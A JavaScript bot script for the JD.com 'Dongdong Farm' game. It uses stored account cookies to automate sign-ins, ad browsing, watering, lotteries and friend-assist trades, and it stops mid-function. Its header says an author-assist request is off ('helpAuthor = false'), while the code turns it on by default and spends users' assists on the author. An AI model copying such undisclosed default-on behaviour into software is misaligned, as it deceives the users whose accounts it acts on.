/*
东东水果:脚本更新地址 https://gitee.com/lxk0301/jd_scripts/raw/master/jd_fruit.js
更新时间：2021-1-9
活动入口：京东APP我的-更多工具-东东农场
东东农场活动链接：https://h5.m.jd.com/babelDiy/Zeus/3KSjXqQabiTuD1cJ28QskrpWoBKT/index.html
脚本内置了一个给作者任务助力的网络请求，默认开启，如介意请自行关闭。
参数 helpAuthor = false
脚本作者：lxk0301
*/
const $ = new Env('东东农场');
let cookiesArr = [], cookie = '', jdFruitShareArr = [], isBox = false, notify, newShareCodes, allMessage = '';
//助力好友分享码(最多4个,否则后面的助力失败),原因:京东农场每人每天只有四次助力机会
//此此内容是IOS用户下载脚本到本地使用，填写互助码的地方，同一京东账号的好友互助码请使用@符号隔开。
//下面给出两个账号的填写示例（iOS只支持2个京东账号）
let shareCodes = [ // 这个列表填入你要助力的好友的shareCode
   //账号一的好友shareCode,不同好友的shareCode中间用@符号隔开
  '',
  //账号二的好友shareCode,不同好友的shareCode中间用@符号隔开
  '',
]
let message = '', subTitle = '', option = {}, isFruitFinished = false;
const retainWater = 100;//保留水滴大于多少g,默认100g;
let jdNotify = false;//是否关闭通知，false打开通知推送，true关闭通知推送
let jdFruitBeanCard = false;//农场使用水滴换豆卡(如果出现限时活动时100g水换20豆,此时比浇水划算,推荐换豆),true表示换豆(不浇水),false表示不换豆(继续浇水),脚本默认是浇水
let randomCount = $.isNode() ? 20 : 5;
let helpAuthor = true;
const JD_API_HOST = 'https://api.m.jd.com/client.action';
const urlSchema = `openjd://virtual?params=%7B%20%22category%22:%20%22jump%22,%20%22des%22:%20%22m%22,%20%22url%22:%20%22https://h5.m.jd.com/babelDiy/Zeus/3KSjXqQabiTuD1cJ28QskrpWoBKT/index.html%22%20%7D`;
!(async () => {
  await requireConfig();
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      await TotalBean();
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      message = '';
      subTitle = '';
      option = {};
      await shareCodesFormat();
      await jdFruit();

    }
  }
  if ($.isNode() && allMessage && $.ctrTemp) {
    await notify.sendNotify(`${$.name}`, `${allMessage}`)
  }
})()
    .catch((e) => {
      $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
    })
    .finally(() => {
      $.done();
    })
async function jdFruit() {
  subTitle = `【京东账号${$.index}】${$.nickName}`;
  try {
    if(helpAuthor){
      await shuye72()
    }
    await initForFarm();
    if ($.farmInfo.farmUserPro) {
      // option['media-url'] = $.farmInfo.farmUserPro.goodsImage;
      message = `【水果名称】${$.farmInfo.farmUserPro.name}\n`;
      console.log(`\n【京东账号${$.index}（${$.nickName || $.UserName}）的${$.name}好友互助码】${$.farmInfo.farmUserPro.shareCode}\n`);
      console.log(`\n【已成功兑换水果】${$.farmInfo.farmUserPro.winTimes}次\n`);
      message += `【已兑换水果】${$.farmInfo.farmUserPro.winTimes}次\n`;
      await masterHelpShare();//助力好友
      if ($.farmInfo.treeState === 2 || $.farmInfo.treeState === 3) {
        option['open-url'] = urlSchema;
        $.msg($.name, ``, `【京东账号${$.index}】${$.nickName || $.UserName}\n【提醒⏰】${$.farmInfo.farmUserPro.name}已可领取\n请去京东APP或微信小程序查看\n点击弹窗即达`, option);
        if ($.isNode()) {
          await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}水果已可领取`, `【京东账号${$.index}】${$.nickName || $.UserName}\n【提醒⏰】${$.farmInfo.farmUserPro.name}已可领取\n请去京东APP或微信小程序查看`);
        }
        return
      } else if ($.farmInfo.treeState === 1) {
        console.log(`\n${$.farmInfo.farmUserPro.name}种植中...\n`)
      } else if ($.farmInfo.treeState === 0) {
        //已下单购买, 但未开始种植新的水果
        option['open-url'] = urlSchema;
        $.msg($.name, ``, `【京东账号${$.index}】 ${$.nickName || $.UserName}\n【提醒⏰】您忘了种植新的水果\n请去京东APP或微信小程序选购并种植新的水果\n点击弹窗即达`, option);
        if ($.isNode()) {
          await notify.sendNotify(`${$.name} - 您忘了种植新的水果`, `京东账号${$.index} ${$.nickName}\n【提醒⏰】您忘了种植新的水果\n请去京东APP或微信小程序选购并种植新的水果`);
        }
        return
      }
      await doDailyTask();
      await doTenWater();//浇水十次
      await getFirstWaterAward();//领取首次浇水奖励
      await getTenWaterAward();//领取10浇水奖励
      await getWaterFriendGotAward();//领取为2好友浇水奖励
      await duck();
      await doTenWaterAgain();//再次浇水
      await predictionFruit();//预测水果成熟时间
    } else {
      console.log(`初始化农场数据异常, 请登录京东 app查看农场0元水果功能是否正常,农场初始化数据: ${JSON.stringify($.farmInfo)}`);
      message = `【数据异常】请手动登录京东app查看此账号${$.name}是否正常`;
    }
  } catch (e) {
    console.log(`任务执行异常，请检查执行日志 ‼️‼️`);
    $.logErr(e);
    message = `任务执行异常，请检查执行日志 ‼️‼️`;
  }
  await showMsg();
}
async function doDailyTask() {
  await taskInitForFarm();
  console.log(`开始签到`);
  if (!$.farmTask.signInit.todaySigned) {
    await signForFarm(); //签到
    if ($.signResult.code === "0") {
      console.log(`【签到成功】获得${$.signResult.amount}g💧\\n`)
      //message += `【签到成功】获得${$.signResult.amount}g💧\n`//连续签到${signResult.signDay}天
    } else {
      // message += `签到失败,详询日志\n`;
      console.log(`签到结果:  ${JSON.stringify($.signResult)}`);
    }
  } else {
    console.log(`今天已签到,连续签到${$.farmTask.signInit.totalSigned},下次签到可得${$.farmTask.signInit.signEnergyEachAmount}g\n`);
  }
  // 被水滴砸中
  console.log(`被水滴砸中： ${$.farmInfo.todayGotWaterGoalTask.canPop ? '是' : '否'}`);
  if ($.farmInfo.todayGotWaterGoalTask.canPop) {
    await gotWaterGoalTaskForFarm();
    if ($.goalResult.code === '0') {
      console.log(`【被水滴砸中】获得${$.goalResult.addEnergy}g💧\\n`);
      // message += `【被水滴砸中】获得${$.goalResult.addEnergy}g💧\n`
    }
  }
  console.log(`签到结束,开始广告浏览任务`);
  if (!$.farmTask.gotBrowseTaskAdInit.f) {
    let adverts = $.farmTask.gotBrowseTaskAdInit.userBrowseTaskAds
    let browseReward = 0
    let browseSuccess = 0
    let browseFail = 0
    for (let advert of adverts) { //开始浏览广告
      if (advert.limit <= advert.hadFinishedTimes) {
        // browseReward+=advert.reward
        console.log(`${advert.mainTitle}+ ' 已完成`);//,获得${advert.reward}g
        continue;
      }
      console.log('正在进行广告浏览任务: ' + advert.mainTitle);
      await browseAdTaskForFarm(advert.advertId, 0);
      if ($.browseResult.code === '0') {
        console.log(`${advert.mainTitle}浏览任务完成`);
        //领取奖励
        await browseAdTaskForFarm(advert.advertId, 1);
        if ($.browseRwardResult.code === '0') {
          console.log(`领取浏览${advert.mainTitle}广告奖励成功,获得${$.browseRwardResult.amount}g`)
          browseReward += $.browseRwardResult.amount
          browseSuccess++
        } else {
          browseFail++
          console.log(`领取浏览广告奖励结果:  ${JSON.stringify($.browseRwardResult)}`)
        }
      } else {
        browseFail++
        console.log(`广告浏览任务结果:   ${JSON.stringify($.browseResult)}`);
      }
    }
    if (browseFail > 0) {
      console.log(`【广告浏览】完成${browseSuccess}个,失败${browseFail},获得${browseReward}g💧\\n`);
      // message += `【广告浏览】完成${browseSuccess}个,失败${browseFail},获得${browseReward}g💧\n`;
    } else {
      console.log(`【广告浏览】完成${browseSuccess}个,获得${browseReward}g💧\n`);
      // message += `【广告浏览】完成${browseSuccess}个,获得${browseReward}g💧\n`;
    }
  } else {
    console.log(`今天已经做过浏览广告任务\n`);
  }
  //定时领水
  if (!$.farmTask.gotThreeMealInit.f) {
    //
    await gotThreeMealForFarm();
    if ($.threeMeal.code === "0") {
      console.log(`【定时领水】获得${$.threeMeal.amount}g💧\n`);
      // message += `【定时领水】获得${$.threeMeal.amount}g💧\n`;
    } else {
      // message += `【定时领水】失败,详询日志\n`;
      console.log(`定时领水成功结果:  ${JSON.stringify($.threeMeal)}`);
    }
  } else {
    console.log('当前不在定时领水时间断或者已经领过\n')
  }
  //给好友浇水
  if (!$.farmTask.waterFriendTaskInit.f) {
    if ($.farmTask.waterFriendTaskInit.waterFriendCountKey < $.farmTask.waterFriendTaskInit.waterFriendMax) {
      await doFriendsWater();
    }
  } else {
    console.log(`给${$.farmTask.waterFriendTaskInit.waterFriendMax}个好友浇水任务已完成\n`)
  }
  // await Promise.all([
  //   clockInIn(),//打卡领水
  //   executeWaterRains(),//水滴雨
  //   masterHelpShare(),//助力好友
  //   getExtraAward(),//领取额外水滴奖励
  //   turntableFarm()//天天抽奖得好礼
  // ])
  await getAwardInviteFriend();
  await clockInIn();//打卡领水
  await executeWaterRains();//水滴雨
  await getExtraAward();//领取额外水滴奖励
  await turntableFarm()//天天抽奖得好礼
}
async function predictionFruit() {
  console.log('开始预测水果成熟时间\n');
  await initForFarm();
  await taskInitForFarm();
  let waterEveryDayT = $.farmTask.totalWaterTaskInit.totalWaterTaskTimes;//今天到到目前为止，浇了多少次水
  message += `【今日共浇水】${waterEveryDayT}次\n`;
  message += `【剩余 水滴】${$.farmInfo.farmUserPro.totalEnergy}g💧\n`;
  message += `【水果🍉进度】${(($.farmInfo.farmUserPro.treeEnergy / $.farmInfo.farmUserPro.treeTotalEnergy) * 100).toFixed(2)}%，已浇水${$.farmInfo.farmUserPro.treeEnergy / 10}次,还需${($.farmInfo.farmUserPro.treeTotalEnergy - $.farmInfo.farmUserPro.treeEnergy) / 10}次\n`
  if ($.farmInfo.toFlowTimes > ($.farmInfo.farmUserPro.treeEnergy / 10)) {
    message += `【开花进度】再浇水${$.farmInfo.toFlowTimes - $.farmInfo.farmUserPro.treeEnergy / 10}次开花\n`
  } else if ($.farmInfo.toFruitTimes > ($.farmInfo.farmUserPro.treeEnergy / 10)) {
    message += `【结果进度】再浇水${$.farmInfo.toFruitTimes - $.farmInfo.farmUserPro.treeEnergy / 10}次结果\n`
  }
  // 预测n天后水果课可兑换功能
  let waterTotalT = ($.farmInfo.farmUserPro.treeTotalEnergy - $.farmInfo.farmUserPro.treeEnergy - $.farmInfo.farmUserPro.totalEnergy) / 10;//一共还需浇多少次水

  let waterD = Math.ceil(waterTotalT / waterEveryDayT);

  message += `【预测】${waterD === 1 ? '明天' : waterD === 2 ? '后天' : waterD + '天之后'}(${timeFormat(24 * 60 * 60 * 1000 * waterD + Date.now())}日)可兑换水果🍉`
}
//浇水十次
async function doTenWater() {
  jdFruitBeanCard = $.getdata('jdFruitBeanCard') ? $.getdata('jdFruitBeanCard') : jdFruitBeanCard;
  if ($.isNode() && process.env.FRUIT_BEAN_CARD) {
    jdFruitBeanCard = process.env.FRUIT_BEAN_CARD;
  }
  await myCardInfoForFarm();
  const { fastCard, doubleCard, beanCard, signCard  } = $.myCardInfoRes;
  if (`${jdFruitBeanCard}` === 'true' && JSON.stringify($.myCardInfoRes).match(`限时翻倍`) && beanCard > 0) {
    console.log(`您设置的是使用水滴换豆卡，且背包有水滴换豆卡${beanCard}张, 跳过10次浇水任务`)
    return
  }
  if ($.farmTask.totalWaterTaskInit.totalWaterTaskTimes < $.farmTask.totalWaterTaskInit.totalWaterTaskLimit) {
    console.log(`\n准备浇水十次`);
    let waterCount = 0;
    isFruitFinished = false;
    for (; waterCount < $.farmTask.totalWaterTaskInit.totalWaterTaskLimit - $.farmTask.totalWaterTaskInit.totalWaterTaskTimes; waterCount++) {
      console.log(`第${waterCount + 1}次浇水`);
      await waterGoodForFarm();
      console.log(`本次浇水结果:   ${JSON.stringify($.waterResult)}`);
      if ($.waterResult.code === '0') {
        console.log(`剩余水滴${$.waterResult.totalEnergy}g`);
        if ($.waterResult.finished) {
          // 已证实，waterResult.finished为true，表示水果可以去领取兑换了
          isFruitFinished = true;
          break
        } else {
          if ($.waterResult.totalEnergy < 10) {
            console.log(`水滴不够，结束浇水`)
            break
          }
          await gotStageAward();//领取阶段性水滴奖励
        }
      } else {
        console.log('浇水出现失败异常,跳出不在继续浇水')
        break;
      }
    }
    if (isFruitFinished) {
      option['open-url'] = urlSchema;
      $.msg($.name, ``, `【京东账号${$.index}】${$.nickName || $.UserName}\n【提醒⏰】${$.farmInfo.farmUserPro.name}已可领取\n请去京东APP或微信小程序查看\n点击弹窗即达`, option);
      $.done();
      if ($.isNode()) {
        await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName || $.UserName}水果已可领取`, `京东账号${$.index} ${$.nickName}\n${$.farmInfo.farmUserPro.name}已可领取`);
      }
    }
  } else {
    console.log('\n今日已完成10次浇水任务\n');
  }
}
//领取首次浇水奖励
async function getFirstWaterAward() {
  await taskInitForFarm();
  //领取首次浇水奖励
  if (!$.farmTask.firstWaterInit.f && $.farmTask.firstWaterInit.totalWaterTimes > 0) {
    await firstWaterTaskForFarm();
    if ($.firstWaterReward.code === '0') {
      console.log(`【首次浇水奖励】获得${$.firstWaterReward.amount}g💧\n`);
      // message += `【首次浇水奖励】获得${$.firstWaterReward.amount}g💧\n`;
    } else {
      // message += '【首次浇水奖励】领取奖励失败,详询日志\n';
      console.log(`领取首次浇水奖励结果:  ${JSON.stringify($.firstWaterReward)}`);
    }
  } else {
    console.log('首次浇水奖励已领取\n')
  }
}
//领取十次浇水奖励
async function getTenWaterAward() {
  //领取10次浇水奖励
  if (!$.farmTask.totalWaterTaskInit.f && $.farmTask.totalWaterTaskInit.totalWaterTaskTimes >= $.farmTask.totalWaterTaskInit.totalWaterTaskLimit) {
    await totalWaterTaskForFarm();
    if ($.totalWaterReward.code === '0') {
      console.log(`【十次浇水奖励】获得${$.totalWaterReward.totalWaterTaskEnergy}g💧\n`);
      // message += `【十次浇水奖励】获得${$.totalWaterReward.totalWaterTaskEnergy}g💧\n`;
    } else {
      // message += '【十次浇水奖励】领取奖励失败,详询日志\n';
      console.log(`领取10次浇水奖励结果:  ${JSON.stringify($.totalWaterReward)}`);
    }
  } else if ($.farmTask.totalWaterTaskInit.totalWaterTaskTimes < $.farmTask.totalWaterTaskInit.totalWaterTaskLimit) {
    // message += `【十次浇水奖励】任务未完成，今日浇水${$.farmTask.totalWaterTaskInit.totalWaterTaskTimes}次\n`;
    console.log(`【十次浇水奖励】任务未完成，今日浇水${$.farmTask.totalWaterTaskInit.totalWaterTaskTimes}次\n`);
  }
  console.log('finished 水果任务完成!');
}
//再次浇水
async function doTenWaterAgain() {
  console.log('开始检查剩余水滴能否再次浇水再次浇水\n');
  await initForFarm();
  let totalEnergy  = $.farmInfo.farmUserPro.totalEnergy;
  console.log(`剩余水滴${totalEnergy}g\n`);
  await myCardInfoForFarm();
  const { fastCard, doubleCard, beanCard, signCard  } = $.myCardInfoRes;
  console.log(`背包已有道具:\n快速浇水卡:${fastCard === -1 ? '未解锁': fastCard + '张'}\n水滴翻倍卡:${doubleCard === -1 ? '未解锁': doubleCard + '张'}\n水滴换京豆卡:${beanCard === -1 ? '未解锁' : beanCard + '张'}\n加签卡:${signCard === -1 ? '未解锁' : signCard + '张'}\n`)
  if (totalEnergy >= 100 && doubleCard > 0) {
    //使用翻倍水滴卡
    for (let i = 0; i < new Array(doubleCard).fill('').length; i++) {
      await userMyCardForFarm('doubleCard');
      console.log(`使用翻倍水滴卡结果:${JSON.stringify($.userMyCardRes)}`);
    }
    await initForFarm();
    totalEnergy = $.farmInfo.farmUserPro.totalEnergy;
  }
  if (signCard > 0) {
    //使用加签卡
    for (let i = 0; i < new Array(signCard).fill('').length; i++) {
      await userMyCardForFarm('signCard');
      console.log(`使用加签卡结果:${JSON.stringify($.userMyCardRes)}`);
    }
    await initForFarm();
    totalEnergy = $.farmInfo.farmUserPro.totalEnergy;
  }
  jdFruitBeanCard = $.getdata('jdFruitBeanCard') ? $.getdata('jdFruitBeanCard') : jdFruitBeanCard;
  if ($.isNode() && process.env.FRUIT_BEAN_CARD) {
    jdFruitBeanCard = process.env.FRUIT_BEAN_CARD;
  }
  if (`${jdFruitBeanCard}` === 'true' && JSON.stringify($.myCardInfoRes).match('限时翻倍')) {
    console.log(`\n您设置的是水滴换豆功能,现在为您换豆`);
    if (totalEnergy >= 100 && $.myCardInfoRes.beanCard > 0) {
      //使用水滴换豆卡
      await userMyCardForFarm('beanCard');
      console.log(`使用水滴换豆卡结果:${JSON.stringify($.userMyCardRes)}`);
      if ($.userMyCardRes.code === '0') {
        message += `【水滴换豆卡】获得${$.userMyCardRes.beanCount}个京豆\n`;
        return
      }
    } else {
      console.log(`您目前水滴:${totalEnergy}g,水滴换豆卡${$.myCardInfoRes.beanCard}张,暂不满足水滴换豆的条件,为您继续浇水`)
    }
  }
  // if (totalEnergy > 100 && $.myCardInfoRes.fastCard > 0) {
  //   //使用快速浇水卡
  //   await userMyCardForFarm('fastCard');
  //   console.log(`使用快速浇水卡结果:${JSON.stringify($.userMyCardRes)}`);
  //   if ($.userMyCardRes.code === '0') {
  //     console.log(`已使用快速浇水卡浇水${$.userMyCardRes.waterEnergy}g`);
  //   }
  //   await initForFarm();
  //   totalEnergy  = $.farmInfo.farmUserPro.totalEnergy;
  // }
  // 所有的浇水(10次浇水)任务，获取水滴任务完成后，如果剩余水滴大于等于60g,则继续浇水(保留部分水滴是用于完成第二天的浇水10次的任务)
  let overageEnergy = totalEnergy - retainWater;
  if (totalEnergy >= ($.farmInfo.farmUserPro.treeTotalEnergy - $.farmInfo.farmUserPro.treeEnergy)) {
    //如果现有的水滴，大于水果可兑换所需的对滴(也就是把水滴浇完，水果就能兑换了)
    isFruitFinished = false;
    for (let i = 0; i < ($.farmInfo.farmUserPro.treeTotalEnergy - $.farmInfo.farmUserPro.treeEnergy) / 10; i++) {
      await waterGoodForFarm();
      console.log(`本次浇水结果(水果马上就可兑换了):   ${JSON.stringify($.waterResult)}`);
      if ($.waterResult.code === '0') {
        console.log('\n浇水10g成功\n');
        if ($.waterResult.finished) {
          // 已证实，waterResult.finished为true，表示水果可以去领取兑换了
          isFruitFinished = true;
          break
        } else {
          console.log(`目前水滴【${$.waterResult.totalEnergy}】g,继续浇水，水果马上就可以兑换了`)
        }
      } else {
        console.log('浇水出现失败异常,跳出不在继续浇水')
        break;
      }
    }
    if (isFruitFinished) {
      option['open-url'] = urlSchema;
      $.msg($.name, ``, `【京东账号${$.index}】${$.nickName || $.UserName}\n【提醒⏰】${$.farmInfo.farmUserPro.name}已可领取\n请去京东APP或微信小程序查看\n点击弹窗即达`, option);
      $.done();
      if ($.isNode()) {
        await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}水果已可领取`, `京东账号${$.index} ${$.nickName}\n${$.farmInfo.farmUserPro.name}已可领取`);
      }
    }
  } else if (overageEnergy >= 10) {
    console.log("目前剩余水滴：【" + totalEnergy + "】g，可继续浇水");
    isFruitFinished = false;
    for (let i = 0; i < parseInt(overageEnergy / 10); i++) {
      await waterGoodForFarm();
      console.log(`本次浇水结果:   ${JSON.stringify($.waterResult)}`);
      if ($.waterResult.code === '0') {
        console.log(`\n浇水10g成功,剩余${$.waterResult.totalEnergy}\n`)
        if ($.waterResult.finished) {
          // 已证实，waterResult.finished为true，表示水果可以去领取兑换了
          isFruitFinished = true;
          break
        } else {
          await gotStageAward()
        }
      } else {
        console.log('浇水出现失败异常,跳出不在继续浇水')
        break;
      }
    }
    if (isFruitFinished) {
      option['open-url'] = urlSchema;
      $.msg($.name, ``, `【京东账号${$.index}】${$.nickName || $.UserName}\n【提醒⏰】${$.farmInfo.farmUserPro.name}已可领取\n请去京东APP或微信小程序查看\n点击弹窗即达`, option);
      $.done();
      if ($.isNode()) {
        await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}水果已可领取`, `京东账号${$.index} ${$.nickName}\n${$.farmInfo.farmUserPro.name}已可领取`);
      }
    }
  } else {
    console.log("目前剩余水滴：【" + totalEnergy + "】g,不再继续浇水,保留部分水滴用于完成第二天【十次浇水得水滴】任务")
  }
}
//领取阶段性水滴奖励
function gotStageAward() {
  return new Promise(async resolve => {
    if ($.waterResult.waterStatus === 0 && $.waterResult.treeEnergy === 10) {
      console.log('果树发芽了,奖励30g水滴');
      await gotStageAwardForFarm('1');
      console.log(`浇水阶段奖励1领取结果 ${JSON.stringify($.gotStageAwardForFarmRes)}`);
      if ($.gotStageAwardForFarmRes.code === '0') {
        // message += `【果树发芽了】奖励${$.gotStageAwardForFarmRes.addEnergy}\n`;
        console.log(`【果树发芽了】奖励${$.gotStageAwardForFarmRes.addEnergy}\n`);
      }
    } else if ($.waterResult.waterStatus === 1) {
      console.log('果树开花了,奖励40g水滴');
      await gotStageAwardForFarm('2');
      console.log(`浇水阶段奖励2领取结果 ${JSON.stringify($.gotStageAwardForFarmRes)}`);
      if ($.gotStageAwardForFarmRes.code === '0') {
        // message += `【果树开花了】奖励${$.gotStageAwardForFarmRes.addEnergy}g💧\n`;
        console.log(`【果树开花了】奖励${$.gotStageAwardForFarmRes.addEnergy}g💧\n`);
      }
    } else if ($.waterResult.waterStatus === 2) {
      console.log('果树长出小果子啦, 奖励50g水滴');
      await gotStageAwardForFarm('3');
      console.log(`浇水阶段奖励3领取结果 ${JSON.stringify($.gotStageAwardForFarmRes)}`)
      if ($.gotStageAwardForFarmRes.code === '0') {
        // message += `【果树结果了】奖励${$.gotStageAwardForFarmRes.addEnergy}g💧\n`;
        console.log(`【果树结果了】奖励${$.gotStageAwardForFarmRes.addEnergy}g💧\n`);
      }
    }
    resolve()
  })
}
//天天抽奖活动
async function turntableFarm() {
  await initForTurntableFarm();
  if ($.initForTurntableFarmRes.code === '0') {
    //领取定时奖励 //4小时一次
    let {timingIntervalHours, timingLastSysTime, sysTime, timingGotStatus, remainLotteryTimes, turntableInfos} = $.initForTurntableFarmRes;

    if (!timingGotStatus) {
      console.log(`是否到了领取免费赠送的抽奖机会----${sysTime > (timingLastSysTime + 60*60*timingIntervalHours*1000)}`)
      if (sysTime > (timingLastSysTime + 60*60*timingIntervalHours*1000)) {
        await timingAwardForTurntableFarm();
        console.log(`领取定时奖励结果${JSON.stringify($.timingAwardRes)}`);
        await initForTurntableFarm();
        remainLotteryTimes = $.initForTurntableFarmRes.remainLotteryTimes;
      } else {
        console.log(`免费赠送的抽奖机会未到时间`)
      }
    } else {
      console.log('4小时候免费赠送的抽奖机会已领取')
    }
    if ($.initForTurntableFarmRes.turntableBrowserAds && $.initForTurntableFarmRes.turntableBrowserAds.length > 0) {
      for (let index = 0; index < $.initForTurntableFarmRes.turntableBrowserAds.length; index++) {
        if (!$.initForTurntableFarmRes.turntableBrowserAds[index].status) {
          console.log(`开始浏览天天抽奖的第${index + 1}个逛会场任务`)
          await browserForTurntableFarm(1, $.initForTurntableFarmRes.turntableBrowserAds[index].adId);
          if ($.browserForTurntableFarmRes.code === '0' && $.browserForTurntableFarmRes.status) {
            console.log(`第${index + 1}个逛会场任务完成，开始领取水滴奖励\n`)
            await browserForTurntableFarm(2, $.initForTurntableFarmRes.turntableBrowserAds[index].adId);
            if ($.browserForTurntableFarmRes.code === '0') {
              console.log(`第${index + 1}个逛会场任务领取水滴奖励完成\n`)
              await initForTurntableFarm();
              remainLotteryTimes = $.initForTurntableFarmRes.remainLotteryTimes;
            }
          }
        } else {
          console.log(`浏览天天抽奖的第${index + 1}个逛会场任务已完成`)
        }
      }
    }
    //天天抽奖助力
    console.log('开始天天抽奖--好友助力--每人每天只有三次助力机会.')
    for (let code of newShareCodes) {
      if (code === $.farmInfo.farmUserPro.shareCode) {
        console.log('天天抽奖-不能自己给自己助力\n')
        continue
      }
      await lotteryMasterHelp(code);
      // console.log('天天抽奖助力结果',lotteryMasterHelpRes.helpResult)
      if ($.lotteryMasterHelpRes.helpResult.code === '0') {
        console.log(`天天抽奖-助力${$.lotteryMasterHelpRes.helpResult.masterUserInfo.nickName}成功\n`)
      } else if ($.lotteryMasterHelpRes.helpResult.code === '11') {
        console.log(`天天抽奖-不要重复助力${$.lotteryMasterHelpRes.helpResult.masterUserInfo.nickName}\n`)
      } else if ($.lotteryMasterHelpRes.helpResult.code === '13') {
        console.log(`天天抽奖-助力${$.lotteryMasterHelpRes.helpResult.masterUserInfo.nickName}失败,助力次数耗尽\n`);
        break;
      }
    }
    console.log(`---天天抽奖次数remainLotteryTimes----${remainLotteryTimes}次`)
    //抽奖
    if (remainLotteryTimes > 0) {
      console.log('开始抽奖')
      let lotteryResult = '';
      for (let i = 0; i < new Array(remainLotteryTimes).fill('').length; i++) {
        await lotteryForTurntableFarm()
        console.log(`第${i + 1}次抽奖结果${JSON.stringify($.lotteryRes)}`);
        if ($.lotteryRes.code === '0') {
          turntableInfos.map((item) => {
            if (item.type === $.lotteryRes.type) {
              console.log(`lotteryRes.type${$.lotteryRes.type}`);
              if ($.lotteryRes.type.match(/bean/g) && $.lotteryRes.type.match(/bean/g)[0] === 'bean') {
                lotteryResult += `${item.name}个，`;
              } else if ($.lotteryRes.type.match(/water/g) && $.lotteryRes.type.match(/water/g)[0] === 'water') {
                lotteryResult += `${item.name}，`;
              } else {
                lotteryResult += `${item.name}，`;
              }
            }
          })
          //没有次数了
          if ($.lotteryRes.remainLotteryTimes === 0) {
            break
          }
        }
      }
      if (lotteryResult) {
        console.log(`【天天抽奖】${lotteryResult.substr(0, lotteryResult.length - 1)}\n`)
        // message += `【天天抽奖】${lotteryResult.substr(0, lotteryResult.length - 1)}\n`;
      }
    }  else {
      console.log('天天抽奖--抽奖机会为0次')
    }
  } else {
    console.log('初始化天天抽奖得好礼失败')
  }
}
//领取额外奖励水滴
async function getExtraAward() {
  await masterHelpTaskInitForFarm();
  if ($.masterHelpResult.code === '0') {
    if ($.masterHelpResult.masterHelpPeoples && $.masterHelpResult.masterHelpPeoples.length >= 5) {
      // 已有五人助力。领取助力后的奖励
      if (!$.masterHelpResult.masterGotFinal) {
        await masterGotFinishedTaskForFarm();
        if ($.masterGotFinished.code === '0') {
          console.log(`已成功领取好友助力奖励：【${$.masterGotFinished.amount}】g水`);
          message += `【额外奖励】${$.masterGotFinished.amount}g水领取成功\n`;
        }
      } else {
        console.log("已经领取过5好友助力额外奖励");
        message += `【额外奖励】已被领取过\n`;
      }
    } else {
      console.log("助力好友未达到5个");
      message += `【额外奖励】领取失败,原因：给您助力的人未达5个\n`;
    }
    if ($.masterHelpResult.masterHelpPeoples && $.masterHelpResult.masterHelpPeoples.length > 0) {
      let str = '';
      $.masterHelpResult.masterHelpPeoples.map((item, index) => {
        if (index === ($.masterHelpResult.masterHelpPeoples.length - 1)) {
          str += item.nickName || "匿名用户";
        } else {
          str += (item.nickName || "匿名用户") + ',';
        }
        let date = new Date(item.time);
        let time = date.getFullYear() + '-' + (date.getMonth() + 1) + '-' + date.getDate() + ' ' + date.getHours() + ':' + date.getMinutes() + ':' + date.getMinutes();
        console.log(`\n京东昵称【${item.nickName || "匿名用户"}】 在 ${time} 给您助过力\n`);
      })
      message += `【助力您的好友】${str}\n`;
    }
    console.log('领取额外奖励水滴结束\n');
  }
}
//助力好友
async function masterHelpShare() {
  console.log('开始助力好友')
  let salveHelpAddWater = 0;
  let remainTimes = 4;//今日剩余助力次数,默认4次（京东农场每人每天4次助力机会）。
  let helpSuccessPeoples = '';//成功助力好友
  console.log(`格式化后的助力码::${JSON.stringify(newShareCodes)}\n`);

  for (let code of newShareCodes) {
    console.log(`开始助力京东账号${$.index} - ${$.nickName}的好友: ${code}`);
    if (!code) continue;
    if (code === $.farmInfo.farmUserPro.shareCode) {
      console.log('不能为自己助力哦，跳过自己的shareCode\n')
      continue
    }
    await masterHelp(code);
    if ($.helpResult.code === '0') {
      if ($.helpResult.helpResult.code === '0') {
        //助力成功
        salveHelpAddWater += $.helpResult.helpResult.salveHelpAddWater;
        console.log(`【助力好友结果】: 已成功给【${$.helpResult.helpResult.masterUserInfo.nickName}】助力`);
        console.log(`给好友【${$.helpResult.helpResult.masterUserInfo.nickName}】助力获得${$.helpResult.helpResult.salveHelpAddWater}g水滴`)
        helpSuccessPeoples += ($.helpResult.helpResult.masterUserInfo.nickName || '匿名用户') + ',';
      } else if ($.helpResult.helpResult.code === '8') {
        console.log(`【助力好友结果】: 助力【${$.helpResult.helpResult.masterUserInfo.nickName}】失败，您今天助力次数已耗尽`);
      } else if ($.helpResult.helpResult.code === '9') {
        console.log(`【助力好友结果】: 之前给【${$.helpResult.helpResult.masterUserInfo.nickName}】助力过了`);
      } else if ($.helpResult.helpResult.code === '10') {
        console.log(`【助力好友结果】: 好友【${$.helpResult.helpResult.masterUserInfo.nickName}】已满五人助力`);
      } else {
        console.log(`助力其他情况：${JSON.stringify($.helpResult.helpResult)}`);
      }
      console.log(`【今日助力次数还剩】${$.helpResult.helpResult.remainTimes}次\n`);
      remainTimes = $.helpResult.helpResult.remainTimes;
      if ($.helpResult.helpResult.remainTimes === 0) {
        console.log(`您当前助力次数已耗尽，跳出助力`);
        break
      }
    } else {
      console.log(`助力失败::${JSON.stringify($.helpResult)}`);
    }
  }
  if ($.isLoon() || $.isQuanX() || $.isSurge()) {
    let helpSuccessPeoplesKey = timeFormat() + $.farmInfo.farmUserPro.shareCode;
